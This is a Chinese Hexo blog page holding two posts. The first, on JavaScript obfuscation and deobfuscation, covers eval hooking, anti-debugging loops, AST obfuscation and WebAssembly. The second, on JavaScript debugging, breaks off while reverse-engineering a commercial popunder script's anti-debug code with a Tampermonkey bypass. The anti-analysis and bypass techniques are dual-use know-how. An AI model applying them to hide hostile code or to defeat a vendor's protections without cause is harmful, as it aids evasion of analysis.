<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="Try your best!">
<meta property="og:type" content="website">
<meta property="og:title" content="上善若水">
<meta property="og:url" content="http://yoursite.com/page/5/index.html">
<meta property="og:site_name" content="上善若水">
<meta property="og:description" content="Try your best!">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="上善若水">
<meta name="twitter:description" content="Try your best!">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.2',
    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":false,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/5/"/>





  <title>上善若水 - 古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">上善若水</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/14/JavaScript反混淆与混淆/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/11/14/JavaScript反混淆与混淆/" itemprop="url">JavaScript反混淆与混淆</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-14T00:10:18+08:00">
                2017-11-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/misc/" itemprop="url" rel="index">
                    <span itemprop="name">misc</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>本文摘抄于岚光的博客<a href="https://0x0d.im/archives/javascript-anti-debug-and-obfuscator.html" target="_blank" rel="external">https://0x0d.im/archives/javascript-anti-debug-and-obfuscator.html</a></p>
<p>前些时候因为人机识别和反作弊业务的需求调研了<a href="https://0x0d.im/archives/broswer-fingerprint-and-tracking.html" target="_blank" rel="external">浏览器指纹和追踪</a>的一些方法，那么当我们把检测代码上线后，怎么保护它，不被攻击者迅速分析破解呢？</p>
<p>常见的编码（如 <a href="http://dean.edwards.name/packer/" target="_blank" rel="external">Base62</a>）、压缩（如 <a href="https://github.com/mishoo/UglifyJS2" target="_blank" rel="external">UglifyJS</a>）、复杂化表达式（如填充无用代码，拆分字符串）就不细说了。<br>至于将 JavaScript 代码隐藏在图片中类似隐写术的方法，一般是恶意程序为了逃避杀毒软件检测所用，正常业务很少用到。</p>
<p>通常用各种编码“加密”的代码，无论怎样变形，其最终都要调用一次 <code>eval</code> 等函数执行。<br>只需劫持关键函数调用的行为，改为文本输出（如 <code>console.log</code>）即可得到载体中隐藏的代码。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">eval</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">	<span class="built_in">console</span>.log(<span class="string">'eval'</span>, <span class="built_in">JSON</span>.stringify(<span class="built_in">arguments</span>));</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="built_in">eval</span>(<span class="string">'console.log("Hello world!")'</span>);</div></pre></td></tr></table></figure>
<p>去除空格、换行，缩短函数、变量名之类的压缩代码可以直接用浏览器的开发者工具格式化，或是使用 <a href="http://jsbeautifier.org/" target="_blank" rel="external">jsbeautifier</a> 等在线工具美化。<br>复杂化表达式会增加代码复杂度，极大地降低可读性，但有经验和耐心的研究者依然能慢慢调试还原出功能来。</p>
<p>(下面代码在 Chrome 59 上测试通过）</p>
<h4 id="Console"><a href="#Console" class="headerlink" title="Console"></a>Console</h4><p>检测到浏览器 Console 打开（<a href="http://stackoverflow.com/questions/40153206/detect-all-browser-console-open-or-not" target="_blank" rel="external">Detect all browser console open or not</a>）时阻塞 Javascript 执行：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> checkStatus;</div><div class="line"><span class="keyword">var</span> element = <span class="keyword">new</span> Image();</div><div class="line"><span class="comment">// var element = document.createElement('any');</span></div><div class="line">element.__defineGetter__(<span class="string">'id'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    checkStatus = <span class="string">'on'</span>;</div><div class="line">&#125;);</div><div class="line">setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    checkStatus = <span class="string">'off'</span>;</div><div class="line">    <span class="built_in">console</span>.log(element);</div><div class="line">    <span class="built_in">console</span>.clear();</div><div class="line">    <span class="keyword">if</span>(checkStatus = <span class="string">'on'</span>) &#123;</div><div class="line">        alert(<span class="string">'Prohibit the use of console!'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;, <span class="number">1000</span>)</div></pre></td></tr></table></figure>
<h4 id="Debugger"><a href="#Debugger" class="headerlink" title="Debugger"></a>Debugger</h4><p>Console 调试时会自动停在断点处，借此可以插入随机的 debugger 干扰正常调试。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">!<span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// 捕获异常，递归次数过多调试工具会抛出异常。</span></div><div class="line">    <span class="keyword">try</span>&#123;</div><div class="line">        !<span class="function"><span class="keyword">function</span> <span class="title">cir</span>(<span class="params">i</span>)</span></div><div class="line">        &#123;</div><div class="line">            <span class="comment">// 当打开调试工具后，抛出异常，setTimeout执行test无参数，此时i == NaN，("" + i / i).length == 3</span></div><div class="line">            <span class="comment">// debugger设置断点</span></div><div class="line">            ( <span class="number">1</span> !== ( <span class="string">""</span> + i / i).length || <span class="number">0</span>===i ) &amp;&amp; <span class="function"><span class="keyword">function</span>(<span class="params">&#123;&#125;.constructor(<span class="string">"debugger"</span></span>)(<span class="params"></span>),<span class="title">cir</span>(<span class="params">++i</span>);</span></div><div class="line">        &#125; (<span class="params"><span class="number">0</span></span>)</div><div class="line">    &#125; <span class="title">catch</span>(<span class="params">e</span>) &#123;</div><div class="line">        setTimeout(test,<span class="number">500</span>)</div><div class="line">    &#125;</div><div class="line">&#125;()</div></pre></td></tr></table></figure>
<p><strong>demo：</strong><a href="https://jsfiddle.net/ftpgxm/t4ux8xp4/2/" target="_blank" rel="external">https://jsfiddle.net/ftpgxm/t4ux8xp4/2/</a></p>
<p>当然，为了能够调试，我们可以使用Tampermonkey，在执行js代码之前，先执行下列代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">window._setTimeout = window.setTimeout;</div><div class="line">window.setTimeout = function () &#123;&#125;;</div></pre></td></tr></table></figure>
<p>具体可参考：</p>
<ul>
<li><a href="http://www.jianshu.com/p/9148d215c119" target="_blank" rel="external">http://www.jianshu.com/p/9148d215c119</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/29214928" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/29214928</a></li>
</ul>
<h4 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h4><p>通过修改 <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree" target="_blank" rel="external">AST(Abstract Syntax Tree)</a> 生成一个新的 AST，混淆规则有拆分字符串、拆分数组，增加废代码等。<br>如在同构语法的基础上提取出所有 key 值到闭包的参数中，破坏代码的可读性：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.getElementById(<span class="string">'a'</span>);</div><div class="line">a.innerHTML = <span class="string">'test'</span>;</div></pre></td></tr></table></figure>
<p>混淆之后是：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a,b,c,d,e,f</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> g=a[b][c](d);</div><div class="line">    g[e]=f</div><div class="line">&#125;)(<span class="built_in">window</span>,<span class="string">'document'</span>, <span class="string">'getElementById'</span>, <span class="string">'a'</span>, <span class="string">'innerHTML'</span>, <span class="string">'test'</span>);</div></pre></td></tr></table></figure>
<h4 id="WebAssembly"><a href="#WebAssembly" class="headerlink" title="WebAssembly"></a>WebAssembly</h4><p><a href="https://en.wikipedia.org/wiki/WebAssembly" target="_blank" rel="external">WebAssembly</a> 是可用于浏览器的字节码格式，比 JS 更高效，能从 <code>C/C++</code> 编译。<br>如一个简单的 <code>add</code> 和 <code>square</code>：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">WebAssembly.compile(<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="string">`</span></div><div class="line">  00 61 73 6d  01 00 00 00  01 0c 02 60  02 7f 7f 01</div><div class="line">  7f 60 01 7f  01 7f 03 03  02 00 01 07  10 02 03 61</div><div class="line">  64 64 00 00  06 73 71 75  61 72 65 00  01 0a 13 02</div><div class="line">  08 00 20 00  20 01 6a 0f  0b 08 00 20  00 20 00 6c</div><div class="line">  0f 0b`.trim().split(<span class="regexp">/[\s\r\n]+/g</span>).map(<span class="function"><span class="params">str</span> =&gt;</span> <span class="built_in">parseInt</span>(str, <span class="number">16</span>))</div><div class="line">)).then(<span class="function"><span class="params">module</span> =&gt;</span> &#123;</div><div class="line">  <span class="keyword">const</span> instance = <span class="keyword">new</span> WebAssembly.Instance(<span class="built_in">module</span>)</div><div class="line">  <span class="keyword">const</span> &#123; add, square &#125; = instance.exports</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'2 + 4 ='</span>, add(<span class="number">2</span>, <span class="number">4</span>))</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'3^2 ='</span>, square(<span class="number">3</span>))</div><div class="line">  <span class="built_in">console</span>.log(<span class="string">'(2 + 5)^2 ='</span>, square(add(<span class="number">2</span> + <span class="number">5</span>)))</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<p>它可能是终极的解决办法，因为作为二进制编码它自带“混淆”，还可以进一步加壳或虚拟机保护。</p>
<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>对于大部分的 JS 代码混淆加密，其实都可以用 <a href="https://en.wikipedia.org/wiki/Partial_evaluation" target="_blank" rel="external">Partial evaluation</a> 解决（参见讨论：<a href="https://www.v2ex.com/t/367641" target="_blank" rel="external">https://www.v2ex.com/t/367641</a>）。<br>如 Google 的 <a href="https://closure-compiler.appspot.com/" target="_blank" rel="external">Closure Compiler</a> 和 FaceBook 的 <a href="https://prepack.io/" target="_blank" rel="external">Prepack</a>，虽然是用于 JS 代码优化的工具，<br>但它们都会在编译期重构 AST、计算函数、初始化对象等，最终还原出正常的可读的代码。</p>
<p>对于干扰 Console 调试的方法，可以用 Fiddler 或 Burp Suite 抓包，拦截页面请求，删除或注释掉干扰代码。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<ul>
<li><a href="http://blog.knownsec.com/2015/08/use-estools-aid-deobfuscate-javascript/" target="_blank" rel="external">使用 estools 辅助反混淆</a></li>
<li><a href="http://div.io/topic/1220" target="_blank" rel="external">Javascript 移动时代的前端加密</a></li>
<li><a href="https://jaq.alibaba.com/community/art/show?spm=a313e.7916648.0.0.foiOcx&amp;articleid=503" target="_blank" rel="external">可信前端之路-代码保护</a></li>
<li><a href="http://infosec.bjtu.edu.cn/wangwei/wp-content/uploads/2016/10/%E6%B7%B7%E6%B7%86%E6%81%B6%E6%84%8FJavaScript%E4%BB%A3%E7%A0%81%E7%9A%84%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%8F%8D%E6%B7%B7%E6%B7%86%E6%96%B9%E6%B3%95%E7%A0%94%E7%A9%B6-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AD%A6%E6%8A%A5.pdf" target="_blank" rel="external">混淆恶意JavaScript代码的检测与反混淆方法研究</a></li>
<li><a href="https://www.zhihu.com/question/29266193" target="_blank" rel="external">怎样理解 Partial Evaluation</a></li>
<li><a href="https://segmentfault.com/a/1190000008402872" target="_blank" rel="external">WebAssembly 实践：如何写代码</a></li>
</ul>
</blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/11/13/javascript的调试/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/11/13/javascript的调试/" itemprop="url">javascript的调试</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-13T17:36:16+08:00">
                2017-11-13
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/code/" itemprop="url" rel="index">
                    <span itemprop="name">code</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>javascript作为一种普适性的脚本语言，广泛应用于网页端、移动端。而本文将要讲述的是javascript的调试。</p>
<h3 id="调试工具"><a href="#调试工具" class="headerlink" title="调试工具"></a>调试工具</h3><h4 id="javascript内置命令调试"><a href="#javascript内置命令调试" class="headerlink" title="javascript内置命令调试"></a>javascript内置命令调试</h4><p>javascript作为一种脚本语言，内置了大量的输出函数。这里主要讲述的是alert/prompt/confirm、console.log、document.write。</p>
<p>其实上面的&quot;、&quot;已经为我们分好类的。</p>
<ol>
<li>弹框式输出</li>
<li>console命令框输出</li>
<li>网页内输出</li>
</ol>
<p><strong>弹框式输出</strong></p>
<p>优点：可以作为IO中断</p>
<p>缺点：由于是中断操作，频繁的确定会比较麻烦。弹框中所能容纳的字符数有限</p>
<p><strong>console命令框输出</strong></p>
<p>优点：输出内容无限制</p>
<p>缺点：不能产生中断，较长的代码调试起来相对而言较麻烦</p>
<p><strong>网页内输出</strong></p>
<p>优点：由于是在网页内部输出，所以内容样式可以自定义。输出内容也没有限制</p>
<p>缺点：不能产生中断，较长的代码调试起来相对而言较麻烦</p>
<p><strong>辅助工具</strong></p>
<p>由于输出的内容多样化，很多时候我们需要的字符串类型，这时候不妨使用toString函数，以此来方便查看输出结果！</p>
<h4 id="Visual-Studio-Code"><a href="#Visual-Studio-Code" class="headerlink" title="Visual Studio Code"></a>Visual Studio Code</h4><p>vsc是最近我所使用的文本编辑器，以前一直使用sublime作为文本编辑的工具。visual studio code是一款轻量级的IDE，可进行多种脚本语言的调试与编写！而且vsc支持windows、mac、linux，是一款不可多得的调试软件。具体操作步骤就不再赘述，因为与vs基本一致！</p>
<p>优点：支持多种脚本语言的编译调试</p>
<p>缺点：由于visual studio code使用nodejs作为底层调试器，所以不支持弹框式输出以及I网页内输出等方式。这也就意味着，很多在浏览器中能够实现的编写方式在这里很有可能编译不通</p>
<h4 id="Chrome开发者模式-推荐"><a href="#Chrome开发者模式-推荐" class="headerlink" title="Chrome开发者模式(推荐)"></a>Chrome开发者模式<font color="#f00">(推荐)</font></h4><p>chrome的开发者模式中，sources选项栏中支持了调试。其右上角给出了调试工具、断点信息、监听器信息等等，总而言之功能十分强大。</p>
<p>优点：chrome开发者模式进行调试，能够解决大部分js静态分析问题，功能齐全，支持几乎全部的js命令</p>
<p>缺点：现如今有许多网页在做开发的时候，进行了反调试功能。这个时候，chrome的开发者模式进行调试可能效果不明显。但是我们可以配合<font color="#f00"><a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?utm_source=chrome-ntp-icon" target="_blank" rel="external">Tampermonkey</a></font> 进行脚本设置，封闭/变相禁用反调试功能。</p>
<p>范例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">window</span>._setTimeout = <span class="built_in">window</span>.setTimeout;</div><div class="line">    <span class="built_in">window</span>.setTimeout = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</div><div class="line">&#125;)();</div></pre></td></tr></table></figure>
<p>由于在执行网页中的js代码之前，先调用了上述代码。所以setTimeout函数都给更改了，这就导致了反调试的重要一环被截断，这会在后面的章节进行讲述。</p>
<h3 id="综合范例"><a href="#综合范例" class="headerlink" title="综合范例"></a>综合范例</h3><p>可以说这儿的范例是从网上摘抄的，所以大家擦亮的自己的眼睛，防止被误导。</p>
<h4 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h4><p>最近在研究 PopUnder 的实现方案，通过 Google 搜索 <code>js popunder</code> 出来的第一页中有个网站 <code>popunderjs.com</code>，当时看了下，这是个提供 popunder 解决方案的一家公司，而且再翻了几页，发现市面上能解决这个问题的，只有2家公司，可见这个市场基本是属于垄断型的。<br>popunderjs 原来在 github 上是有开源代码的，但后来估计作者发现这个需求巨大的商业价值，索性不开源了，直接收费。所以现在要研究它的实现方案，只能上官网扒它源码了。</p>
<p>这是它的示例页：<code>http://code.ptcong.com/demos/bjp/demo.html</code><br>分别加载了几个重要文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://code.ptcong.com/demos/bjp/script.js?0.3687041198903791</div><div class="line">http://code.ptcong.com/demos/bjp/license.demo.js?0.31109710863616447</div></pre></td></tr></table></figure>
<h4 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h4><p>script.js 是功能主体，实现了 popunder 的所有功能以及定义了多个 API 方法<br>license.demo.js 是授权文件，有这个文件你才能顺利调用 script.js 里的方法</p>
<h4 id="防止被逆向"><a href="#防止被逆向" class="headerlink" title="防止被逆向"></a>防止被逆向</h4><p>这么具有商业价值的代码，就这么公开地给你们用，肯定要考虑好被逆向的问题。我们来看看它是怎么反逆向的。<br>首先，打开控制台，发现2个问题：</p>
<ol>
<li>控制台所有内容都被反复清空，只输出了这么一句话：<code>Console was cleared script.js?0.5309098417125133:1</code></li>
<li>无法断点调试，因为一旦启用断点调试功能，就会被定向到一个匿名函数 <code>(function() {debugger})</code></li>
</ol>
<p>也就是说，常用的断点调试方法已经无法使用了，我们只能看看源代码，看能不能理解它的逻辑了。但是，它源代码是这样的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> a = <span class="keyword">typeof</span> <span class="built_in">window</span> === S[<span class="number">0</span>] &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">window</span>[S[<span class="number">1</span>]] !== S[<span class="number">2</span>] ? <span class="built_in">window</span> : global;</div><div class="line"><span class="keyword">try</span> &#123;</div><div class="line">    a[S[<span class="number">3</span>]](S[<span class="number">4</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">    ;</div><div class="line">&#125; <span class="keyword">catch</span> (a) &#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">        [S[<span class="number">11</span>]](S[<span class="number">12</span>])());</div><div class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">        ;</div><div class="line">    &#125; <span class="keyword">catch</span> (a) &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="regexp">/TypeError/</span>[S[<span class="number">15</span>]](a + S[<span class="number">16</span>])) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">            ;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可见源代码是根本不可能阅读的，所以还是得想办法破掉它的反逆向措施。</p>
<h4 id="利用工具巧妙破解反逆向"><a href="#利用工具巧妙破解反逆向" class="headerlink" title="利用工具巧妙破解反逆向"></a>利用工具巧妙破解反逆向</h4><p>首先在断点调试模式一步步查看它都执行了哪些操作，突然就发现了这么一段代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    (<span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            (<span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params">i</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> ((<span class="string">''</span> + (i / i)).length !== <span class="number">1</span> || i % <span class="number">20</span> === <span class="number">0</span>) &#123;</div><div class="line">                    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;</div><div class="line">                    ).constructor(<span class="string">'debugger'</span>)();</div><div class="line">                &#125; <span class="keyword">else</span> &#123;</div><div class="line">                    <span class="keyword">debugger</span> ;</div><div class="line">                &#125;</div><div class="line">                b(++i);</div><div class="line">            &#125;</div><div class="line">            )(<span class="number">0</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (e) &#123;</div><div class="line">            setTimeout(a, <span class="number">5000</span>);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    )()</div><div class="line">&#125;</div><div class="line">)();</div></pre></td></tr></table></figure>
<p>这段代码主要有2部分，一是通过 try {} 块内的 b() 函数来判断是否打开了控制台，如果是的话就进行自我调用，反复进入 debugger 这个断点，从而达到干扰我们调试的目的。如果没有打开控制台，那调用 debugger 就会抛出异常，这时就在 catch {} 块内设置定时器，5秒后再调用一下 b() 函数。</p>
